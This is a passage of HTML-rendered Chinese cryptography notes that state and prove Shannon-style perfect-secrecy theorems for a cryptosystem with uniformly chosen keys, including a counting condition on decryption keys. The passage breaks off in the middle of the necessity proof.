separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">x\in P,y\in C,|{k:x=d_k(y)}|=\frac{|K|}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，则该密码体制完善保密。</font></p><p>证明：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mo>∑</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y|x]=\sum Pr[k:x=d_k(y)]=\frac{1}{|K|}\cdot \frac{|K|}{|P|}=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><mi>P</mi></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y]=\sum_{x_i\in P} Pr[x_i]Pr[y|x_i]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.14981em;vertical-align:-0.39981em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39981em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p><font color=blue>深层理解：定理2与定理3的区别于定义1和定理4的区别类似，没有限定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>。如果二者不等，则存在有密码体制满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi><mo mathvariant="normal">≠</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">|{k:x=d_k(y)}|\ne\frac{|K|}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，但也满足上述结论。当其等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{|K|}{|C|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时易证其也成立。</font></p><hr /><p><font color=red>定理3：对于密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,E,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>等概率选取，当且仅当对于任意的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi mathvariant="normal">∣</mi><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">∣</mi><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">x\in P,y\in C,|{k:x=d_k(y)}|=\frac{|K|}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，该密码体制完善保密。</font></p><p>证明：充分性已证明。<br />必要性：若该密码体制具有完全保密性，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y]=Pr[y|x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span>，由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>等概率选取，因此对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">x\in P,y\in 